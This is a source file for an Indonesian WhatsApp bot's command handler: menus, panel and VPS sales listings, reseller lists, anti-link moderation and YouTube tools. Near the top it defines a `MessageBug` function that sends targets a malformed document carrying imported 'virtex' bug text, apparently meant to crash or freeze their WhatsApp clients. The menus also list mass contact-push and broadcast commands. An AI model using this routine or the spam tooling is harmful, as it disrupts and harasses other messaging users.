module.exports = async (fadhost, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const rdm = () =>{
const randomNumbers = [];
for (let i = 0; i < 10; i++) {
  const randomNumber = Math.floor(Math.random() * 10);
  randomNumbers.push(randomNumber);
}
return randomNumbers.join('')
}
const makeid = rdm()
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await fadhost.decodeJid(fadhost.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await fadhost.groupMetadata(m.chat) : {}
let participant_bot = isGroup ? groupMetadata?.participants?.find((v) => v.id == botNumber) : ''
let participant_sender = isGroup ? groupMetadata?.participants?.find((v) => v.id == m.sender) : ''
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { version } = require("./package.json")
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./all/function.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
const antilink = JSON.parse(fs.readFileSync('./all/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./all/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const reseller = JSON.parse(fs.readFileSync("./all/database/reseller.json"))
const { teksbug1 } = require("./all/database/virtex.js")
const { teksbug2 } = require("./all/database/delay.js")
let isReseller = reseller.includes(m.sender)
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}

const MessageBug = async (target) => {
return fadhost.sendMessage(target, {document: fs.readFileSync("./package.json"), mimetype: "😄😇😂🔥", fileName: "Paket.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: qbug})
}

let ppuser
try {
ppuser = await fadhost.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}

async function fadhostReply(teks) {
return fadhost.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: ppuser, title: "｢ ACCESS DENIED ｣", body: "© Powered By "+namabot, previewType: "PHOTO"}}}, {quoted: m})
}

const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `ownername`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: namabot
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By ${namaowner}`,
inviteExpiration: Date.now() + 1814400000
}
}}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": "",
},
"title": `Pterodactyl Server By ${namaowner}`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "9999999999",
"retailerId": `Powered By fadhost`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}

const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}

const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Powered By ${namaowner}`, jpegThumbnail: ""}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot JPM By ZarxdOffc`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot Pushkontak By VannOFC`,jpegThumbnail: ""}}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6283822455492:+62 838-2245-5492\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

if (global.owneroff && !isCmd) {
if (!isGroup && !isOwner) {
let teks = `*Hai Kak* @${m.sender.split('@')[0]}

Maaf *Ownerku Sedang Offline*, Silahkan Tunggu Owner Kembali Online & Jangan Spam Chat`
return fadhost.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnail: fs.readFileSync("./media/ownermode.jpg"), renderLargerThumbnail: false, title: "｢ OWNER OFFLINE MODE ｣", mediaUrl: linkgc, sourceUrl: linkyt, previewType: "PHOTO"}}}, {quoted: null})
}}

if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await fadhost.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await fadhost.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await fadhost.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await fadhost.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}

if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await fadhost.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await fadhost.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await fadhost.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}


switch (command) {
case "menu": case "p": case "pp": {

let teksnya = `
*Haii* @${m.sender.split("@")[0]},\nAda Yang Bisa Saya Bantu Kak?

 *▧ Botname :* ${global.namabot2}
 *▧ Creator :* ${global.owner}
 *▧ Runtime :* ${runtime(process.uptime())}
 *▧ Version :* ${version}`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg")}, { upload: fadhost.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Menu", "sections": [{ "title": "# Pilih Salah Satu Menu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Allmenu", "title": "List All Fitur Bot", "id": ".allmenu" }, 
{ "header": "Mainmenu", "title": "List Main Menu", "id": ".mainmenu" }, 
{ "header": "Produkmenu", "title": "List Produk Owner", "id": ".produkmenu" }, 
{ "header": "Downloader", "title": "List Download Menu", "id": ".downloadmenu" }, 
{ "header": "Converter", "title": "List Convert Menu", "id": ".convertmenu" }, 
{ "header": "Panelmenu", "title": "List Panel Menu", "id": ".panelmenu" }, 
{ "header": "Domainmenu", "title": "List Domain Menu", "id": ".domainmenu" }, 
{ "header": "Pushkontakmenu", "title": "List Pushkontak Menu", "id": ".pushkontakmenu" }, 
{ "header": "Grupmenu", "title": "List Grup Menu", "id": ".grupmenu" }, 
{ "header": "Ownermenu", "title": "List Owner Menu", "id": ".ownermenu" }]}]}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Script Bot💌\",\"url\":\"${global.linkyt}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Profile Owner👤\",\"url\":\"${global.linkyt}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{ 
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"ZARXDMODS wa.me/6283822455492\",\"title\":\"Kontak Owner\",\"id\":\".owner\"}" 
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await fadhost.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "allmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}
 
*乂 M A I N M E N U*
* play
* tourl
* yts
* tohd
* chatgpt
* ai
* remini
* sticker
* pinterest
* qc
  
*乂 L I S T P R O D U C T*
* panel
* vps
* domain
* scriptbot
  
*乂 D O W N L O A D E R*
* tiktok
* tiktokmp3
* tiktokaudio
* tiktokslide
* instagram
* facebook
* ytmp3
* mediafire
  
*乂 C O N V E R T E R*
* toaudio
* tomp3
* tovn
* toptv
* tts
* toimage
  
*乂 P A N E L M E N U*
* addseller
* delseller
* listseller
* addadmin
* addadmin2
* cpanel
* cpanel2
* cpanel3
* listpanel
* listadmin
* deladmin
* delpanel
  
*乂 D O M A I N M E N U*
* listdomain
* listsubdomain
* delsubdomain
  
*乂 P U S H M E N U*
* pushkontak
* pushkontak1
* pushkontak2
* savekontak
* savekontak2
* listgc
* idgc
* jpm
* jpm2
* jpmpromosi
* jpmtesti
* jpmhidetag
* startjpm
* setteksjpm
* teksjpm

*乂 G R O U P M E N U*
* addmember
* antilink
* antilinkV2
* hidetag
* tagall
* delete
* open/close
* setnamagc
* setdeskgc
* setppgc
* kick
* promote
* leavegc
* leavegc2
* demote
  
*乂 O W N E R M E N U*
* clearsession
* modeoff
* modeon
* done
* anticall
* autoread
* welcome
* setthumbnail
* setppbotpanjang
* setppbot
* setnamabot
* setbiobot
* jpmslide
`
fadhost.sendOrder(m.chat, teksmenu, fs.readFileSync('./media/thumbnail.jpg'), "99999999", 10000000, qchanel)
}
break
case "mainmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 M A I N M E N U*
* play
* tourl
* yts
* tohd
* chatgpt
* ai
* remini
* sticker
* pinterest
* qc
`
fadhost.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "downloadmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 D O W N L O A D E R*
* tiktok
* tiktokmp3
* tiktokaudio
* tiktokslide
* instagram
* facebook
* ytmp3
* mediafire
`
fadhost.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "produkmenu": {

let teksmenu = `
Silahkan Pilih List Harga Produk`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Harga Produk", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Panel Pterodactyl", "title": "List Harga Panel", "id": ".list_panel" }, 
{ "header": "VPS", "title": "List Harga Vps", "id": ".list_vps" }, 
{ "header": "Domain", "title": "List Harga Domain", "id": ".list_domain" }, 
{ "header": "Script Bot", "title": "List Harga Script Bot", "id": ".list_scbot" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await fadhost.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "pushkontakmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 P U S H M E N U*
* pushkontak
* pushkontak1
* pushkontak2
* savekontak
* savekontak2
* listgc
* idgc
* jpm
* jpm2
* jpmpromosi
* jpmtesti
* jpmhidetag
* startjpm
* setteksjpm
* teksjpm
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Start Promosi\",\"title\":\"Start Promosi\",\"id\":\".startjpm\"}" 
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await fadhost.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "convertmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 C O N V E R T E R*
* toaudio
* tomp3
* tovn
* toptv
* tts
* toimage
`
fadhost.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "panelmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 P A N E L M E N U*
* addseller
* delseller
* listseller
* addadmin
* addadmin2
* cpanel
* cpanel2
* cpanel3
* listpanel
* listadmin
* deladmin
* delpanel`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Klik Disini", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "List Panel", "title": "List Server Panel", "id": ".listpanel" }, 
{ "header": "List Admin", "title": "List Admin Panel", "id": ".listadmin" }, 
{ "header": "List Reseller", "title": "List Reseller Panel", "id": ".listseller" }]}]}`
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Create Panel Otomatis\",\"title\":\"Create Panel V2\",\"id\":\".cpanel2\"}" 
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await fadhost.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "domainmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 D O M A I N M E N U*
* listdomain
* listsubdomain
* delsubdomain
`
fadhost.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "grupmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 G R O U P M E N U*
* addmember
* antilink
* antilinkV2
* hidetag
* tagall
* delete
* open/close
* setnamagc
* setdeskgc
* setppgc
* kick
* promote
* leavegc
* leavegc2
* demote
`
fadhost.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "ownermenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 O W N E R M E N U*
* clearsession
* modeoff
* modeon
* done
* anticall
* autoread
* welcome
* setthumbnail
* setppbotpanjang
* setppbot
* setnamabot
* setbiobot
* jpmslide
`
fadhost.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case 'panel':{

const url = "https://pomf2.lain.la/f/dut8fyks.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: fadhost.waUploadToServer
  })
  return imageMessage
}


    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {},
              carouselMessage: {
                cards: [
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 1GB
  RAM   = 1125
  DISK  = 1125
  CPU   = 40` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (</ Zarxd - Dev />)","url":"https:\\/\\/wa.me\\/6283822455492","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 2GB
  RAM   = 2125
  DISK  = 2125
  CPU   = 60` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (</ Vann - Dev />)","url":"https:\\/\\/wa.me\\/6285783478720","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 3GB
  RAM   = 3125
  DISK  = 3125
  CPU   = 80` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (</ Zarxd - Dev />)","url":"https:\\/\\/wa.me\\/6283822455492","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 4GB
  RAM   = 4125
  DISK  = 4125
  CPU   = 100` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (</ Zarxd - Dev />","url":"https:\\/\\/wa.me\\/6283822455492","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 5GB
  RAM   = 5125
  DISK  = 5125
  CPU   = 120` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (</ Zarxd - Dev />)","url":"https:\\/\\/wa.me\\/6283822455492","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 6GB
  RAM   = 6125
  DISK  = 6125
  CPU   = 140` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (</ Zarxd - Dev />)","url":"https:\\/\\/wa.me\\/6283822455492","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 7GB
  RAM   = 7125
  DISK  = 7125
  CPU   = 160` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (</ Zarxd - Dev />)","url":"https:\\/\\/wa.me\\/6283822455492","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 8GB
  RAM   = 8125
  DISK  = 8125
  CPU   = 180` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (</ Zarxd - Dev />)","url":"https:\\/\\/wa.me\\/6283822455492","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 9GB
  RAM   = 9125
  DISK  = 9125
  CPU   = 200` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (</ Zarxd - Dev />)","url":"https:\\/\\/wa.me\\/6283822455492","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = UNLI
  RAM   = 0
  DISK  = 0
  CPU   = 0` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (</ Zarxd - Dev />)","url":"https:\\/\\/wa.me\\/6283822455492","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      {}
    );

    await fadhost.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
            }
break
case "trxoff": case "modeoff": {

if (!isOwner) return fadhostReply(msg.owner)
global.owneroff = true
m.reply('Berhasil Mengganti Ke Mode *Owner Off*')
}
break
case "trxon": case "modeon": {

if (!isOwner) return fadhostReply(msg.owner)
global.owneroff = false
m.reply('Berhasil Mengganti Ke Mode *Owner ON*')
}
break
case "addseller": {

if (!isOwner) return fadhostReply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (reseller.includes(orang)) return m.reply(`User ${orang.split('@')[0]} Sudah Terdaftar Di Database Reseller Panel!`)
await reseller.push(orang)
await fs.writeFileSync("./all/database/reseller.json", JSON.stringify(reseller))
m.reply(`Berhasil Menjadikan ${orang.split('@')[0]} Sebagai Reseller Panel`)
} else {
return m.reply(example("@tag/62838XXX"))
}}
break
case "delseller": {

if (!isOwner) return fadhostReply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!reseller.includes(orang)) return m.reply(`User ${orang.split('@')[0]} Tidak Terdaftar Di Database Reseller Panel!`)
let indx = reseller.indexOf(orang)
await reseller.splice(indx, 1)
await fs.writeFileSync("./all/database/reseller.json", JSON.stringify(reseller))
m.reply(`Berhasil Menghapus ${orang.split('@')[0]} Dari Database Reseller Panel`)
} else {
return m.reply(example("@tag/62838XXX"))
}}
break
case "listseller": {

if (!isOwner) return fadhostReply(msg.owner)
if (reseller.length < 1) return m.reply("Tidak Ada Reseller Panel")
let teksnya = ` LIST RESELLER PANEL⚡\n\n`
reseller.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
fadhost.sendMessage(m.chat, {text: teksnya, mentions: [...reseller]}, {quoted: qtoko})
}
break
case "yts": {

if (!text) return m.reply(example("Dj Tiktok"))
await m.reply(msg.wait)
await yts(text).then(async (data) => {
if (data.all.length == 0) return m.reply(mess.error)
let teks = '\n*🔎Hasil Pencarian YOUTUBE*\n\n'
for (let i of data.all) {
teks += `*◦ Judul :* ${i.title}
*◦ Channel :* ${i.author?.name || "unknown"}
*◦ Durasi :* ${i?.timestamp || "unknown"}
*◦ Link Url :* ${i.url}\n\n`
}
m.reply(teks)
}).catch(err => m.reply(err.toString()))
}
break
case "ytmp3": case "ytdl": {

if (!text) return m.reply(example('linknya'))
if (!text.includes("https")) return m.reply("Link Tautan Tidak Valid!")
if (!text.includes("youtu")) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
var judul = `./all/tmp/${getRandom(".mp3")}`
const videoURL = text
const options = {
  quality: 'highestaudio',
  filter: 'audioonly'
}
ytdl(videoURL, options)
  .pipe(fs.createWriteStream(judul))
  .on('finish', async function () {
